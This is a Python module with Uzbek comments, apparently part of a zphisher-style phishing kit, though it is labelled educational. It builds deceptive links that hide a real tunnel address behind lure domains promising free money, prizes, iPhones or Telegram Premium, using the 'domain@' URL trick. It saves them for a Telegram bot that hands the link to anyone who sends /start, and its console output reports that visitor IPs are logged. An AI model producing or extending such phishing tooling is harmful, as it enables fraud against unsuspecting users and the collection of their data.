"""
Mask URL generator — ta'lim uchun firibgarlar qanday havola yashirishini ko'rsatish.
URL 1: haqiqiy tunnel | URL 3: yolg'on mask (username@ uslubi)
"""

import json
import random
from pathlib import Path

# Telegram / lotereya / pul tematik maskalar (ta'lim uchun)
MASK_DOMAINS = [
    "hammaga-pul.uz",
    "mega-lucky-win-official.uz",
    "get-unlimited-followers-for-instagram",
    "iphone-17-bepul-sovg'a.uz",
    "5-million-so'm-yutish.uz",
    "telegram-premium-bepul.com",
    "pul-taqdimoti-2026.uz",
    "super-mukofot-bot.uz",
]


def generate_mask_urls(real_url: str) -> dict:
    """zphisher uslubida 3 ta havola yaratish."""
    mask_domain = random.choice(MASK_DOMAINS)
    return {
        "url_1": real_url,
        "url_2": "",
        "url_3": f"https://{mask_domain}@",
        "mask_domain": mask_domain,
    }


def save_mask_urls(project_dir: Path, real_url: str) -> dict:
    """Mask URL larni data/mask_urls.json ga saqlash — bot avtomatik o'qiydi."""
    urls = generate_mask_urls(real_url)
    data_dir = project_dir / "data"
    data_dir.mkdir(parents=True, exist_ok=True)
    out = data_dir / "mask_urls.json"
    out.write_text(json.dumps(urls, ensure_ascii=False, indent=2), encoding="utf-8")
    return urls


def load_mask_urls(project_dir: Path) -> dict | None:
    f = project_dir / "data" / "mask_urls.json"
    if not f.exists():
        return None
    try:
        return json.loads(f.read_text(encoding="utf-8"))
    except (json.JSONDecodeError, OSError):
        return None


def print_urls_console(urls: dict) -> None:
    """Terminalda zphisher uslubida chiqarish."""
    print()
    print(f"[-] URL 1 : {urls.get('url_1', '')}")
    print(f"[-] URL 2 : {urls.get('url_2', '')}")
    print(f"[-] URL 3 : {urls.get('url_3', '')}")
    print()
    print("[-] Telegram bot avtomatik URL 1 dan foydalanadi.")
    print("[-] Ishtirochilar /start yuboradi — havola o'zi beriladi.")
    print("[-] IP saqlanadi: auth/ip.txt")
    print("[-] Kutish rejimi: tashriflar kuzatilmoqda (Ctrl+C to exit info)")
    print()
